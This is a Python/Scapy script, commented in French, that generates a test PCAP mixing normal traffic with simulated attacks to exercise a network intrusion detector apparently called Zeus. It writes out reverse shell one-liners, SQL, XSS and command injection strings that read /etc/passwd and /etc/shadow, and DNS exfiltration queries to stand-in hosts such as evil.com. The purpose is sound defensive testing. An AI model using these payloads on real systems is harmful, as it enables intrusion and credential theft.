#!/usr/bin/env python3
"""
Générateur de trames réseau de test pour Celestis_IA / Zeus
Crée un fichier PCAP avec du trafic normal et malveillant.

Usage:
    python generate_test_pcap.py
    python generate_test_pcap.py --output zeus/captures/mon_test.pcap --count 500
"""

import argparse
import random
import struct
from datetime import datetime
from pathlib import Path

from scapy.all import wrpcap
from scapy.layers.inet import IP, TCP, UDP, ICMP
from scapy.layers.dns import DNS, DNSQR, DNSRR
from scapy.layers.http import HTTP, HTTPRequest, HTTPResponse
from scapy.packet import Raw

# --- Constantes ---
INTERNAL_IPS = [f"192.168.1.{i}" for i in range(2, 30)]
EXTERNAL_IPS = [f"93.184.{random.randint(0,255)}.{random.randint(1,254)}" for _ in range(20)]
DNS_SERVER = "8.8.8.8"
WEB_SERVER = "93.184.216.34"


# ──────────────────────────────────────────────
# Générateurs de trafic NORMAL
# ──────────────────────────────────────────────

def make_http_request(src_ip: str, dst_ip: str, url_path: str = "/index.html") -> list:
    """Requête HTTP GET + réponse 200."""
    sport = random.randint(49152, 65535)
    payload_req = (
        f"GET {url_path} HTTP/1.1\r\n"
        f"Host: {dst_ip}\r\n"
        "User-Agent: Mozilla/5.0\r\n"
        "Accept: text/html\r\n"
        "Connection: keep-alive\r\n\r\n"
    ).encode()
    payload_res = (
        "HTTP/1.1 200 OK\r\n"
        "Content-Type: text/html\r\n"
        "Content-Length: 42\r\n\r\n"
        "<html><body><h1>Hello World</h1></body></html>"
    ).encode()

    pkts = [
        IP(src=src_ip, dst=dst_ip) / TCP(sport=sport, dport=80, flags="S"),
        IP(src=dst_ip, dst=src_ip) / TCP(sport=80, dport=sport, flags="SA"),
        IP(src=src_ip, dst=dst_ip) / TCP(sport=sport, dport=80, flags="A") / Raw(payload_req),
        IP(src=dst_ip, dst=src_ip) / TCP(sport=80, dport=sport, flags="PA") / Raw(payload_res),
        IP(src=src_ip, dst=dst_ip) / TCP(sport=sport, dport=80, flags="FA"),
    ]
    return pkts


def make_dns_query(src_ip: str, domain: str = "example.com") -> list:
    """Requête DNS A + réponse."""
    pkts = [
        IP(src=src_ip, dst=DNS_SERVER) / UDP(sport=random.randint(1024, 65535), dport=53)
        / DNS(rd=1, qd=DNSQR(qname=domain)),
        IP(src=DNS_SERVER, dst=src_ip) / UDP(sport=53, dport=random.randint(1024, 65535))
        / DNS(qr=1, aa=1, qd=DNSQR(qname=domain),
              an=DNSRR(rrname=domain, rdata="93.184.216.34")),
    ]
    return pkts


def make_https_handshake(src_ip: str, dst_ip: str) -> list:
    """Simulation d'un handshake TLS (SYN/SYN-ACK/ACK sur port 443)."""
    sport = random.randint(49152, 65535)
    # Client Hello simplifié (quelques octets TLS)
    client_hello = bytes([
        0x16, 0x03, 0x01, 0x00, 0x28,  # TLS Handshake, version 1.0, longueur
        0x01, 0x00, 0x00, 0x24,         # Client Hello
        0x03, 0x03,                     # TLS 1.2
    ]) + bytes(random.getrandbits(8) for _ in range(28))

    return [
        IP(src=src_ip, dst=dst_ip) / TCP(sport=sport, dport=443, flags="S"),
        IP(src=dst_ip, dst=src_ip) / TCP(sport=443, dport=sport, flags="SA"),
        IP(src=src_ip, dst=dst_ip) / TCP(sport=sport, dport=443, flags="A") / Raw(client_hello),
    ]


def make_icmp_ping(src_ip: str, dst_ip: str) -> list:
    """Ping ICMP echo request/reply."""
    return [
        IP(src=src_ip, dst=dst_ip) / ICMP(type=8, code=0) / Raw(b"PING TEST 123456"),
        IP(src=dst_ip, dst=src_ip) / ICMP(type=0, code=0) / Raw(b"PING TEST 123456"),
    ]


def make_ntp_query(src_ip: str) -> list:
    """Requête NTP (UDP 123)."""
    ntp_payload = bytes(48)  # Paquet NTP minimal de 48 octets
    return [
        IP(src=src_ip, dst="129.6.15.28") / UDP(sport=random.randint(1024, 65535), dport=123)
        / Raw(ntp_payload),
    ]


# ──────────────────────────────────────────────
# Générateurs de trafic MALVEILLANT
# ──────────────────────────────────────────────

def make_port_scan(src_ip: str, dst_ip: str, port_count: int = 20) -> list:
    """Scan de ports SYN (nmap-style)."""
    ports = random.sample(range(1, 10000), port_count)
    pkts = []
    for port in ports:
        pkts.append(IP(src=src_ip, dst=dst_ip) / TCP(sport=random.randint(49152, 65535),
                                                      dport=port, flags="S"))
        # Pas de SYN-ACK → comportement typique d'un scan
    return pkts


def make_syn_flood(src_ip: str, dst_ip: str, count: int = 30) -> list:
    """Flood SYN vers un seul port (DDoS)."""
    pkts = []
    for _ in range(count):
        # Adresse source spoofée aléatoirement
        spoofed_src = f"{random.randint(1,254)}.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(1,254)}"
        pkts.append(
            IP(src=spoofed_src, dst=dst_ip) / TCP(sport=random.randint(1024, 65535),
                                                   dport=80, flags="S",
                                                   seq=random.randint(0, 2**32))
        )
    return pkts


def make_sql_injection(src_ip: str, dst_ip: str) -> list:
    """Tentative d'injection SQL via HTTP."""
    payloads = [
        "/login?user=admin'--&pass=x",
        "/search?q=' OR 1=1--",
        "/index.php?id=1 UNION SELECT username,password FROM users--",
        "/api/user?id=1; DROP TABLE users--",
    ]
    pkts = []
    for payload in payloads:
        sport = random.randint(49152, 65535)
        raw = (
            f"GET {payload} HTTP/1.1\r\n"
            f"Host: {dst_ip}\r\n"
            "User-Agent: sqlmap/1.7\r\n\r\n"
        ).encode()
        pkts.append(IP(src=src_ip, dst=dst_ip) / TCP(sport=sport, dport=80, flags="PA") / Raw(raw))
    return pkts


def make_reverse_shell_attempt(src_ip: str, dst_ip: str) -> list:
    """Tentative de reverse shell (payload bash)."""
    payloads = [
        b"bash -i >& /dev/tcp/192.168.1.100/4444 0>&1",
        b"python3 -c 'import socket,os,pty;s=socket.socket();s.connect((\"192.168.1.100\",4444))'",
        b"nc -e /bin/sh 192.168.1.100 4444",
        b"/bin/bash -l > /dev/tcp/192.168.1.100/4444 0<&1 2>&1",
    ]
    pkts = []
    for payload in payloads:
        sport = random.randint(49152, 65535)
        pkts.append(IP(src=src_ip, dst=dst_ip) / TCP(sport=sport, dport=random.choice([4444, 1234, 9999]), flags="PA") / Raw(payload))
    return pkts


def make_brute_force_ssh(src_ip: str, dst_ip: str, attempts: int = 15) -> list:
    """Brute force SSH (connexions répétées sur port 22)."""
    pkts = []
    for i in range(attempts):
        sport = random.randint(49152, 65535)
        pkts.append(IP(src=src_ip, dst=dst_ip) / TCP(sport=sport, dport=22, flags="S"))
        pkts.append(IP(src=dst_ip, dst=src_ip) / TCP(sport=22, dport=sport, flags="SA"))
        pkts.append(
            IP(src=src_ip, dst=dst_ip) / TCP(sport=sport, dport=22, flags="PA")
            / Raw(f"SSH-2.0-OpenSSH_brute attempt {i}\r\n".encode())
        )
        pkts.append(IP(src=src_ip, dst=dst_ip) / TCP(sport=sport, dport=22, flags="FA"))
    return pkts


def make_xss_attempt(src_ip: str, dst_ip: str) -> list:
    """Tentatives XSS via HTTP."""
    xss_payloads = [
        "/search?q=<script>alert('XSS')</script>",
        "/comment?text=<img src=x onerror=alert(1)>",
        "/page?name=javascript:alert(document.cookie)",
    ]
    pkts = []
    for payload in xss_payloads:
        sport = random.randint(49152, 65535)
        raw = (
            f"GET {payload} HTTP/1.1\r\n"
            f"Host: {dst_ip}\r\n"
            "User-Agent: Mozilla/5.0\r\n\r\n"
        ).encode()
        pkts.append(IP(src=src_ip, dst=dst_ip) / TCP(sport=sport, dport=80, flags="PA") / Raw(raw))
    return pkts


def make_dns_exfiltration(src_ip: str) -> list:
    """Exfiltration de données via DNS (tunneling)."""
    # Sous-domaines encodés en base32 simulant de l'exfiltration
    subdomains = [
        "aGVsbG8gd29ybGQ.evil.com",
        "dXNlcjpwYXNzd29yZA.evil.com",
        "c2Vuc2l0aXZlZGF0YQ.data.evil-c2.net",
    ]
    pkts = []
    for sub in subdomains:
        pkts.append(
            IP(src=src_ip, dst="185.220.101.1") / UDP(sport=random.randint(1024, 65535), dport=53)
            / DNS(rd=1, qd=DNSQR(qname=sub))
        )
    return pkts


def make_icmp_flood(src_ip: str, dst_ip: str, count: int = 40) -> list:
    """Flood ICMP (ping flood)."""
    payload = bytes(random.getrandbits(8) for _ in range(1400))
    return [
        IP(src=src_ip, dst=dst_ip) / ICMP(type=8) / Raw(payload)
        for _ in range(count)
    ]


def make_null_scan(src_ip: str, dst_ip: str) -> list:
    """Scan NULL (flags TCP = 0) pour détection de système."""
    ports = random.sample(range(1, 1025), 15)
    return [
        IP(src=src_ip, dst=dst_ip) / TCP(sport=random.randint(49152, 65535),
                                          dport=p, flags=0)
        for p in ports
    ]


def make_command_injection(src_ip: str, dst_ip: str) -> list:
    """Injection de commandes OS via HTTP."""
    payloads = [
        "/ping?host=127.0.0.1;cat /etc/passwd",
        "/cmd?exec=ls+-la+/root",
        "/api?action=`id`",
        "/run?cmd=whoami%26%26cat%20/etc/shadow",
    ]
    pkts = []
    for payload in payloads:
        sport = random.randint(49152, 65535)
        raw = (
            f"GET {payload} HTTP/1.1\r\n"
            f"Host: {dst_ip}\r\n"
            "User-Agent: curl/7.68\r\n\r\n"
        ).encode()
        pkts.append(IP(src=src_ip, dst=dst_ip) / TCP(sport=sport, dport=80, flags="PA") / Raw(raw))
    return pkts


# ──────────────────────────────────────────────
# Orchestrateur
# ──────────────────────────────────────────────

def generate_pcap(output_path: str, total_packets: int = 300) -> None:
    all_packets = []

    src_normal = random.sample(INTERNAL_IPS, min(5, len(INTERNAL_IPS)))
    src_attack = random.sample(INTERNAL_IPS + EXTERNAL_IPS, min(5, len(INTERNAL_IPS + EXTERNAL_IPS)))
    dst_web = WEB_SERVER

    normal_generators = [
        lambda: make_http_request(random.choice(src_normal), dst_web,
                                   random.choice(["/", "/index.html", "/about", "/api/v1/users"])),
        lambda: make_dns_query(random.choice(src_normal),
                                random.choice(["google.com", "github.com", "cloudflare.com"])),
        lambda: make_https_handshake(random.choice(src_normal), dst_web),
        lambda: make_icmp_ping(random.choice(src_normal), dst_web),
        lambda: make_ntp_query(random.choice(src_normal)),
    ]

    malicious_generators = [
        lambda: make_port_scan(random.choice(src_attack), random.choice(INTERNAL_IPS), 20),
        lambda: make_syn_flood(random.choice(src_attack), dst_web, 25),
        lambda: make_sql_injection(random.choice(src_attack), dst_web),
        lambda: make_reverse_shell_attempt(random.choice(src_attack), random.choice(INTERNAL_IPS)),
        lambda: make_brute_force_ssh(random.choice(src_attack), random.choice(INTERNAL_IPS), 10),
        lambda: make_xss_attempt(random.choice(src_attack), dst_web),
        lambda: make_dns_exfiltration(random.choice(src_attack)),
        lambda: make_icmp_flood(random.choice(src_attack), random.choice(INTERNAL_IPS), 30),
        lambda: make_null_scan(random.choice(src_attack), random.choice(INTERNAL_IPS)),
        lambda: make_command_injection(random.choice(src_attack), dst_web),
    ]

    # 60% normal, 40% malveillant
    normal_target = int(total_packets * 0.60)
    malicious_target = total_packets - normal_target

    print(f"[*] Génération de ~{normal_target} paquets normaux et ~{malicious_target} malveillants...")

    while len(all_packets) < normal_target:
        gen = random.choice(normal_generators)
        all_packets.extend(gen())

    while len(all_packets) < normal_target + malicious_target:
        gen = random.choice(malicious_generators)
        all_packets.extend(gen())

    # Mélange pour simuler du trafic entrelacé
    random.shuffle(all_packets)

    Path(output_path).parent.mkdir(parents=True, exist_ok=True)
    wrpcap(output_path, all_packets)

    print(f"[+] PCAP généré : {output_path}")
    print(f"[+] Total paquets : {len(all_packets)}")
    print()
    print("Pour tester avec Zeus :")
    print(f"  python train_ai_workflow.py --skip-capture --pcap {output_path}")
    print(f"  python zeus/zeus_core.py --pcap {output_path}")


# ──────────────────────────────────────────────
# Point d'entrée
# ──────────────────────────────────────────────

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="Générateur de trames de test pour Celestis_IA")
    parser.add_argument("--output", default="zeus/captures/test_traffic.pcap",
                        help="Chemin du fichier PCAP de sortie")
    parser.add_argument("--count", type=int, default=300,
                        help="Nombre approximatif de paquets à générer (défaut: 300)")
    parser.add_argument("--seed", type=int, default=42,
                        help="Graine aléatoire pour la reproductibilité (défaut: 42)")
    args = parser.parse_args()

    random.seed(args.seed)
    generate_pcap(args.output, args.count)
